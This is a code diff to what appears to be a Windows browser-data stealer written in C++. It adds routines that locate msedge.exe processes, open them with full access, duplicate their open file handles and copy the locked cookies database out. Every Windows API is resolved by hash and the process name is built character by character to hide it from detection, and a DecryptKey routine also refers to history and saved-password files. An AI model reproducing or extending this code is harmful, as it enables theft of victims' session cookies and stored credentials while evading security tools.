@@ -61,7 +61,6 @@ struct IElevatorEdge
 };
 
 #define SystemExtendedHandleInformation 64
-#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
     PVOID Object;
@@ -80,12 +79,109 @@ typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
     SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
 } SYSTEM_HANDLE_INFORMATION_EX;
 
+typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
+    HANDLE HandleValue;
+    ULONG_PTR HandleCount;
+    ULONG_PTR PointerCount;
+    ULONG GrantedAccess;
+    ULONG ObjectTypeIndex;
+    ULONG HandleAttributes;
+    ULONG Reserved;
+} PROCESS_HANDLE_TABLE_ENTRY_INFO;
+
+typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
+    ULONG_PTR NumberOfHandles;
+    ULONG_PTR Reserved;
+    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
+} PROCESS_HANDLE_SNAPSHOT_INFORMATION;
+
+typedef struct tagPROCESSENTRY32W
+{
+    DWORD   dwSize;
+    DWORD   cntUsage;
+    DWORD   th32ProcessID;          // this process
+    ULONG_PTR th32DefaultHeapID;
+    DWORD   th32ModuleID;           // associated exe
+    DWORD   cntThreads;
+    DWORD   th32ParentProcessID;    // this process's parent process
+    LONG    pcPriClassBase;         // Base priority of process's threads
+    DWORD   dwFlags;
+    WCHAR   szExeFile[MAX_PATH];    // Path
+} PROCESSENTRY32W;
+typedef PROCESSENTRY32W* PPROCESSENTRY32W;
+typedef PROCESSENTRY32W* LPPROCESSENTRY32W;
+
+#define TH32CS_SNAPPROCESS  0x00000002
+#define ProcessHandleInformation 51
+#define ObjectTypeInformation 2
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
+#define STATUS_BUFFER_TOO_SMALL    ((NTSTATUS)0xC0000023)
+
+size_t GetProcessIdsByName(
+    const wchar_t* processName,
+    DWORD* outPids,
+    size_t maxCount
+)
+{
+    ApiResolve apiResolve;
+    size_t count = 0;
+    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
+    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
+    constexpr unsigned int hashCreateToolhelp32Snapshot = ComplexHashForAnsi("CreateToolhelp32Snapshot");
+    typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(DWORD, DWORD);
+    _CreateToolhelp32Snapshot pCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)apiResolve.GetApiAddress(lpKernel32, hashCreateToolhelp32Snapshot);
+    HANDLE hSnap = pCreateToolhelp32Snapshot(
+        TH32CS_SNAPPROCESS,
+        0
+    );
+
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return 0;
+
+    PROCESSENTRY32W pe = {};
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+    constexpr unsigned int hashProcess32FirstW = ComplexHashForAnsi("Process32FirstW");
+    typedef BOOL(WINAPI* _Process32FirstW)(HANDLE, LPPROCESSENTRY32W);
+    _Process32FirstW pProcess32FirstW = (_Process32FirstW)apiResolve.GetApiAddress(lpKernel32, hashProcess32FirstW);
+
+    constexpr unsigned int hashProcess32NextW = ComplexHashForAnsi("Process32NextW");
+    typedef BOOL(WINAPI* _Process32NextW)(HANDLE, LPPROCESSENTRY32W);
+    _Process32NextW pProcess32NextW = (_Process32NextW)apiResolve.GetApiAddress(lpKernel32, hashProcess32NextW);
+
+    typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
+    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");
+    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
+
+    if (pProcess32FirstW(hSnap, &pe))
+    {
+        do
+        {
+            if (CompareStringW(pe.szExeFile, processName))
+            {
+                if (count < maxCount)
+                {
+                    outPids[count++] =
+                        pe.th32ProcessID;
+                }
+            }
+
+        } while (pProcess32NextW(hSnap, &pe));
+    }
+
+    pCloseHandle(hSnap);
+    return count;
+}
 
 bool CreateCopyFile(char* filename, char* newFileName) {
     ApiResolve apiResolve;
     constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
 
     LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
+
+    constexpr unsigned int hashMessageBoxA = ComplexHashForAnsi("MessageBoxA");
+    typedef int(WINAPI* _MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
+    _MessageBoxA pMessageBoxA = (_MessageBoxA)apiResolve.GetApiAddress(lpKernel32, hashMessageBoxA);
 
     constexpr unsigned int hashGetLastError = ComplexHashForAnsi("GetLastError");
     typedef DWORD(WINAPI* _GetLastError)();
@@ -98,172 +194,236 @@ bool CreateCopyFile(char* filename, char* newFileName) {
     constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
     LPVOID lpNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
 
-    constexpr unsigned int hashNtQuerySystemInformation = ComplexHashForAnsi("NtQuerySystemInformation");
-    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
-        ULONG,
-        PVOID,
-        ULONG,
-        PULONG
+    DWORD pids[256];
+    wchar_t processName[] = {
+        L'm', L's', L'e', L'd', L'g', L'e',
+        L'.', L'e', L'x', L'e',
+        L'\0'
+        };
+    size_t count = GetProcessIdsByName(
+        processName,
+        pids,
+        256
+    );
+    constexpr unsigned int hashNtQueryInformationProcess = ComplexHashForAnsi("NtQueryInformationProcess");
+    typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
+        HANDLE ProcessHandle,
+        ULONG ProcessInformationClass,
+        PVOID ProcessInformation,
+        ULONG ProcessInformationLength,
+        PULONG ReturnLength
         );
 
-    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)apiResolve.GetApiAddress(lpNtdll, hashNtQuerySystemInformation);
+    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)apiResolve.GetApiAddress(lpNtdll, hashNtQueryInformationProcess);
 
-    ULONG size = 0x10000;
-    LPVOID handleInfoBuffer = nullptr;
-    NTSTATUS status;
+    constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
+    typedef HANDLE(WINAPI* _OpenProcess)(DWORD, BOOL, DWORD);
+    _OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
 
-    do {
-        AllocMemory(size, &handleInfoBuffer);
-
-        status = pNtQuerySystemInformation(
-            SystemExtendedHandleInformation,
-            handleInfoBuffer,
-            size,
-            &size
+    for (size_t i = 0; i < count; i++) {
+        DWORD pid = pids[i];
+        HANDLE hProc = pOpenProcess(
+            PROCESS_ALL_ACCESS,
+            FALSE,
+            pid
         );
-
-        if (status == STATUS_INFO_LENGTH_MISMATCH)
-            size *= 2;
-
-    } while (status == STATUS_INFO_LENGTH_MISMATCH);
-
-    if (status < 0) {
-        return 1;
-    }
-
-    auto info = (SYSTEM_HANDLE_INFORMATION_EX*)handleInfoBuffer;
-    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
-        auto& h = info->Handles[i];
-        HANDLE handle = (HANDLE)h.HandleValue;
-
-        char path[MAX_PATH] = { 0 };
-        constexpr unsigned int hashGetFinalPathNameByHandleA = ComplexHashForAnsi("GetFinalPathNameByHandleA");
-        typedef DWORD(WINAPI* _GetFinalPathNameByHandleA)(
-            HANDLE,
-            LPSTR,
-            DWORD,
-            DWORD
-            );
-        _GetFinalPathNameByHandleA pGetFinalPathNameByHandleA = (_GetFinalPathNameByHandleA)apiResolve.GetApiAddress(lpKernel32, hashGetFinalPathNameByHandleA);
-        DWORD len = pGetFinalPathNameByHandleA(
-            handle,
-            path,
-            MAX_PATH,
-            FILE_NAME_NORMALIZED
-        );
-
-        if (len == 0 || len >= MAX_PATH)
-            continue;
-
-        //char pattern[] = "test.txt\0";
-        char* pointer = NULL;
-        FindPatternA(path, filename, StrLen(filename), &pointer);
-        if (pointer == NULL) {
-            continue;
-        }
-        pCloseHandle(handle);
-        return 1;
-        constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
-        typedef HANDLE(WINAPI* _OpenProcess)(DWORD, BOOL, DWORD);
-        _OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
-        HANDLE hProc = pOpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)h.UniqueProcessId);
+        
         if (!hProc) {
             continue;
         }
-
-        HANDLE hCopy = NULL;
-        constexpr unsigned int hashDuplicateHandle = ComplexHashForAnsi("DuplicateHandle");
-        typedef BOOL(WINAPI* _DuplicateHandle)(
-            HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD
-            );
-        _DuplicateHandle pDuplicateHandle = (_DuplicateHandle)apiResolve.GetApiAddress(lpKernel32, hashDuplicateHandle);
-        BOOL dupOk = pDuplicateHandle(
-            (HANDLE)hProc,
-            handle,
-            (HANDLE)-1,
-            &hCopy,
-            GENERIC_READ,
-            FALSE,
-            0
-        );
-
-        //pCloseHandle(hProc);
-        if (!dupOk) {
+        
+        ULONG size = 0x10000;
+        LPVOID bufferProcessInfo = NULL;
+        if (!AllocMemory(size, &bufferProcessInfo)) {
             continue;
         }
 
-        constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
-        typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
-        _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
-        HANDLE hOut = pCreateFileA(
-            newFileName,
-            GENERIC_WRITE,
-            0,
-            NULL,
-            CREATE_ALWAYS,
-            FILE_ATTRIBUTE_NORMAL,
-            NULL
-        );
+        ULONG retLen = 0;
+        NTSTATUS st;
 
-        if (hOut == INVALID_HANDLE_VALUE) {
-            pCloseHandle(hCopy);
-            return 1;
-        }
-
-
-        char buffer[4096];
-        DWORD bytesRead = 0;
-        DWORD bytesWritten = 0;
-
-        ULONGLONG offset = 0;
-
-        while (true) {
-            OVERLAPPED ov = {};
-            ov.Offset = (DWORD)(offset & 0xFFFFFFFF);
-            ov.OffsetHigh = (DWORD)(offset >> 32);
-
-            constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
-            typedef BOOL(WINAPI* _ReadFile)(
-                HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED
-                );
-            _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
-            BOOL ok = pReadFile(
-                hCopy,
-                buffer,
-                sizeof(buffer),
-                &bytesRead,
-                &ov
+        while (true)
+        {
+            st = pNtQueryInformationProcess(
+                hProc,
+                51, //ProcessHandleInformation
+                bufferProcessInfo,
+                size,
+                &retLen
             );
 
-            if (!ok) {
-                DWORD err = pGetLastError();
-
-                if (err == ERROR_HANDLE_EOF)
-                    break;
+            if (st == 0)
                 break;
+
+            if (st == STATUS_INFO_LENGTH_MISMATCH ||
+                st == STATUS_BUFFER_TOO_SMALL)
+            {
+                ULONG newSize = retLen > size ? retLen : size * 2;
+                LPVOID newBuffer = NULL;
+                if (!AllocMemory(newSize, &newBuffer)) { 
+                    FreeMemory(bufferProcessInfo);
+                    pCloseHandle(hProc);
+                    return 0; 
+                }
+
+                FreeMemory(bufferProcessInfo);
+                size = newSize;
+                bufferProcessInfo = newBuffer;
+                continue;
             }
 
-            if (bytesRead == 0)
-                break;
-
-            constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
-            typedef BOOL(WINAPI* _WriteFile)(
-                HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED
-                );
-            _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
-            if (!pWriteFile(hOut, buffer, bytesRead, &bytesWritten, NULL)) {
-                break;
-            }
-
-            offset += bytesRead;
+            FreeMemory(bufferProcessInfo);
+            pCloseHandle(hProc);
+            return 0;
         }
 
-        pCloseHandle(hCopy);
-        pCloseHandle(hOut);
-        break;
+        auto info =
+            (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)bufferProcessInfo;
+
+        for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
+            auto& h = info->Handles[i];
+            HANDLE handle = (HANDLE)h.HandleValue;
+
+            HANDLE hCopy = NULL;
+            constexpr unsigned int hashDuplicateHandle = ComplexHashForAnsi("DuplicateHandle");
+            typedef BOOL(WINAPI* _DuplicateHandle)(
+                HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD
+                );
+            _DuplicateHandle pDuplicateHandle = (_DuplicateHandle)apiResolve.GetApiAddress(lpKernel32, hashDuplicateHandle);
+
+            BOOL dupOk = pDuplicateHandle(
+                hProc,
+                handle,
+                (HANDLE)-1,
+                &hCopy,
+                0,
+                FALSE,
+                DUPLICATE_SAME_ACCESS
+            );
+
+            if (!dupOk || !hCopy) {
+                continue;
+            }
+
+            constexpr unsigned int hashGetFileType = ComplexHashForAnsi("GetFileType");
+            typedef DWORD(WINAPI* _GetFileType)(HANDLE);
+            _GetFileType pGetFileType = (_GetFileType)apiResolve.GetApiAddress(lpKernel32, hashGetFileType);
+
+            if (!pGetFileType || pGetFileType(hCopy) != FILE_TYPE_DISK) {
+                pCloseHandle(hCopy);
+                continue;
+            }
+
+            char path[MAX_PATH] = { 0 };
+            constexpr unsigned int hashGetFinalPathNameByHandleA = ComplexHashForAnsi("GetFinalPathNameByHandleA");
+            typedef DWORD(WINAPI* _GetFinalPathNameByHandleA)(
+                HANDLE,
+                LPSTR,
+                DWORD,
+                DWORD
+                );
+            _GetFinalPathNameByHandleA pGetFinalPathNameByHandleA =
+                (_GetFinalPathNameByHandleA)apiResolve.GetApiAddress(lpKernel32, hashGetFinalPathNameByHandleA);
+
+            DWORD len = pGetFinalPathNameByHandleA(
+                hCopy,
+                path,
+                MAX_PATH,
+                FILE_NAME_NORMALIZED
+            );
+
+            if (len == 0 || len >= MAX_PATH) {
+                pCloseHandle(hCopy);
+                continue;
+            }
+            char* result = NULL;
+            FindPatternA(path, filename, StrLen(filename), &result);
+            if (result == NULL) {
+                pCloseHandle(hCopy);
+                continue;
+            }
+
+            constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
+            typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+            _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
+
+            HANDLE hOut = pCreateFileA(
+                newFileName,
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL
+            );
+
+            if (hOut == INVALID_HANDLE_VALUE) {
+                pCloseHandle(hCopy);
+                FreeMemory(bufferProcessInfo);
+                pCloseHandle(hProc);
+                return 0;
+            }
+
+            char buffer[4096];
+            DWORD bytesRead = 0;
+            DWORD bytesWritten = 0;
+
+            ULONGLONG offset = 0;
+
+            while (true) {
+                OVERLAPPED ov = {};
+                ov.Offset = (DWORD)(offset & 0xFFFFFFFF);
+                ov.OffsetHigh = (DWORD)(offset >> 32);
+
+                constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
+                typedef BOOL(WINAPI* _ReadFile)(
+                    HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED
+                    );
+                _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
+
+                BOOL ok = pReadFile(
+                    hCopy,
+                    buffer,
+                    sizeof(buffer),
+                    &bytesRead,
+                    &ov
+                );
+
+                if (!ok) {
+                    DWORD err = pGetLastError();
+
+                    if (err == ERROR_HANDLE_EOF)
+                        break;
+
+                    break;
+                }
+
+                if (bytesRead == 0)
+                    break;
+
+                constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
+                typedef BOOL(WINAPI* _WriteFile)(
+                    HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED
+                    );
+                _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
+
+                if (!pWriteFile(hOut, buffer, bytesRead, &bytesWritten, NULL)) {
+                    break;
+                }
+
+                if (bytesWritten != bytesRead) {
+                    break;
+                }
+
+                offset += bytesRead;
+            }
+
+            pCloseHandle(hCopy);
+            pCloseHandle(hOut);
+            break;
+        }
+        FreeMemory(bufferProcessInfo);
     }
 
-    FreeMemory(handleInfoBuffer);
     return 1;
 }
 
@@ -564,10 +724,10 @@ void DecryptKey() {
         //CreateCopyFile(cookiesFilename, cookiesPath);
         //CreateCopyFile(historyFilename, historyPath);
         //CreateCopyFile(passwordFilename, passwordPath);
-
-        if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
-            
-        }
+        CreateCopyFile(orCookiesPath, cookiesPath);
+        //if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
+        //    CreateCopyFile(cookiesFilename, cookiesPath);
+        //}
 
         if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
             
